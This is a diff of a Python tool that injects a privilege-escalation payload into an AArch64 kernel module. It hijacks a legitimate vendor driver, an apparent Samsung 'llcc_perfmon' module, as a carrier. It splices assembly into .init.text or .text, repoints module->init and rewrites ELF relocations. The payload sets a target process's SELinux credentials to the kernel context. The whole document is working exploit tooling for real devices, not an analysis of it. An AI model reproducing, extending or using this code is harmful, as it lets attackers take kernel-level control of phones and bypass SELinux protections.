@@ -36,13 +36,13 @@ cred_off = _int(sys.argv[9]) if len(sys.argv) > 9 else 0x778    # task_struct->c
 # highest context. No movz/movk added (offset + sid=1 are plain immediates).
 cred_security_off = _int(sys.argv[10]) if len(sys.argv) > 10 else None
 
-CTX = """    // context = kernel (SECINITSID_KERNEL=1) : cred->security = task_security_struct*
+CTX = """    // context = kernel (SECINITSID_KERNEL=1): cred->security = task_security_struct; set osid+sid
+    // (offsets 0/4) — the pair that drives the task's current SELinux context (id -Z). Keeping it to
+    // one stp saves patch bytes (matters for the .text-splice carrier's tight inject-lib gap).
     ldr  x4, [x2, #{off}]
     cbz  x4, done
     orr  w5, wzr, #1             // w5=1 via ORR (not movz -> not a patched-delta immediate)
-    stp  w5, w5, [x4, #0]        // osid, sid
-    stp  w5, w5, [x4, #8]        // exec_sid, create_sid
-    stp  w5, w5, [x4, #16]       // keycreate_sid, sockcreate_sid""".format(off=hex(cred_security_off)) \
+    stp  w5, w5, [x4, #0]        // osid, sid = SECINITSID_KERNEL""".format(off=hex(cred_security_off)) \
     if cred_security_off is not None else ""
 
 # --- assemble the template (substitute per-target struct offsets) ---
@@ -89,29 +89,64 @@ strtab_off = secs[shstrndx]["off"]
 def sname(nm):
     e = d.index(b"\0", strtab_off + nm); return d[strtab_off + nm:e].decode()
 byname = {sname(s["nm"]): s for s in secs}
-it = byname[".init.text"]; rela = byname[".rela.init.text"]
-assert it["size"] >= len(patch), f".init.text {it['size']} < patch {len(patch)}"
-d[it["off"]:it["off"] + len(patch)] = patch
-# symtab/strtab for symbol names of relocations
-symtab = secs[rela["link"]]; sym_strtab = secs[symtab["link"]]["off"]
+idxname = {sname(s["nm"]): i for i, s in enumerate(secs)}
+symtab = [s for s in secs if s["type"] == 2][0]; sym_strtab = secs[symtab["link"]]["off"]
 def symname(idx):
     so = symtab["off"] + idx * 24
     nm, = struct.unpack_from("<I", d, so)
     e = d.index(b"\0", sym_strtab + nm); return d[sym_strtab + nm:e].decode()
-n = rela["size"] // 24; repointed = 0
-for i in range(n):
-    e = rela["off"] + i * 24
-    r_off, r_info = struct.unpack_from("<QQ", d, e)
-    typ = r_info & 0xffffffff; sym = r_info >> 32
-    if typ == R_AARCH64_CALL26 and symname(sym) == "__platform_driver_register" and repointed == 0:
-        # rewrite: R_AARCH64_ABS64 @ anchor64, same symbol, addend 0 -> loader writes &symbol there
-        struct.pack_into("<Q", d, e, anchor_off)                        # r_offset = anchor64 slot
-        struct.pack_into("<Q", d, e + 8, (sym << 32) | R_AARCH64_ABS64) # r_info = ABS64, same sym
-        struct.pack_into("<q", d, e + 16, 0)                            # r_addend = 0
-        repointed += 1
-    elif r_off < len(patch):
-        struct.pack_into("<Q", d, e + 8, 0)                             # -> R_AARCH64_NONE
-assert repointed == 1, "did not find __platform_driver_register CALL26 anchor"
+def find_sym(name):
+    for i in range(symtab["size"] // 24):
+        if symname(i) == name: return i
+    return None
+
+it = byname[".init.text"]
+if it["size"] >= len(patch):
+    # ---- standard: splice into .init.text (the kernel calls init_module here) ----
+    rela = byname[".rela.init.text"]
+    d[it["off"]:it["off"] + len(patch)] = patch
+    n = rela["size"] // 24; repointed = 0
+    for i in range(n):
+        e = rela["off"] + i * 24
+        r_off, r_info = struct.unpack_from("<QQ", d, e)
+        typ = r_info & 0xffffffff; sym = r_info >> 32
+        if typ == R_AARCH64_CALL26 and symname(sym) == "__platform_driver_register" and repointed == 0:
+            struct.pack_into("<Q", d, e, anchor_off)                        # r_offset = anchor64 slot
+            struct.pack_into("<Q", d, e + 8, (sym << 32) | R_AARCH64_ABS64) # -> ABS64, same sym
+            struct.pack_into("<q", d, e + 16, 0)
+            repointed += 1
+        elif r_off < len(patch):
+            struct.pack_into("<Q", d, e + 8, 0)                             # -> R_AARCH64_NONE
+    assert repointed == 1, "did not find __platform_driver_register CALL26 anchor"
+    splice = ".init.text"
+else:
+    # ---- .text-splice (carrier's .init.text too small, e.g. Q3S llcc_perfmon = 52B): put the patch
+    # in the big .text, repoint module->init to it, and plant the ABS64 anchor via a repurposed
+    # .text reloc. The carrier's real driver code (rest of .text) is never reached (init returns 0). ----
+    txt = byname[".text"]; txt_idx = idxname[".text"]
+    assert txt["size"] >= len(patch), f".text {txt['size']} < patch {len(patch)}"
+    d[txt["off"]:txt["off"] + len(patch)] = patch
+    pdr_sym = find_sym("__platform_driver_register"); assert pdr_sym is not None, "no __platform_driver_register sym"
+    text_secsym = next((i for i in range(symtab["size"] // 24)
+                        if (d[symtab["off"]+i*24+4] & 0xf) == 3
+                        and struct.unpack_from("<H", d, symtab["off"]+i*24+6)[0] == txt_idx), None)
+    assert text_secsym is not None, "no .text section symbol"
+    rela = next(s for s in secs if s["type"] == 4 and s["info"] == txt_idx)   # reloc section for .text
+    for i in range(rela["size"] // 24):                                       # NONE relocs inside the splice
+        e = rela["off"] + i * 24; r_off, = struct.unpack_from("<Q", d, e)
+        if r_off < len(patch): struct.pack_into("<Q", d, e + 8, 0)
+    e0 = rela["off"]                                                          # repurpose entry 0 as the ABS64 anchor
+    struct.pack_into("<Q", d, e0, anchor_off)
+    struct.pack_into("<Q", d, e0 + 8, (pdr_sym << 32) | R_AARCH64_ABS64)
+    struct.pack_into("<q", d, e0 + 16, 0)
+    tmr = byname[".rela.gnu.linkonce.this_module"]; fixed = 0               # repoint module->init to .text+0
+    for i in range(tmr["size"] // 24):
+        e = tmr["off"] + i * 24; r_info, = struct.unpack_from("<Q", d, e + 8)
+        if symname(r_info >> 32) == "init_module":
+            struct.pack_into("<Q", d, e + 8, (text_secsym << 32) | R_AARCH64_ABS64)
+            struct.pack_into("<q", d, e + 16, 0); fixed += 1
+    assert fixed == 1, "did not find module->init reloc"
+    splice = ".text (init repointed)"
 
 # neutralize module_exit: we hijacked init (the carrier's real init never ran), so its real
 # cleanup_module would tear down never-initialized state on rmmod -> crash (rdbg NULL-derefs at
@@ -129,5 +164,5 @@ if ".exit.text" in byname:
 
 open(out, "wb").write(d)
 diffs = sum(1 for i in range(len(d)) if d[i] != bytearray(open(carrier, "rb").read())[i])
-print(f"{out}: patch {len(patch)}B, anchor@0x{anchor_off:x}, {diffs} diff bytes, pid={pid} "
+print(f"{out}: patch {len(patch)}B [{splice}], anchor@0x{anchor_off:x}, {diffs} diff bytes, pid={pid} "
       f"dsel={dsel:#x} dfv={dfv&0xffffffff:#x} dpt={dpt&0xffffffff:#x}")
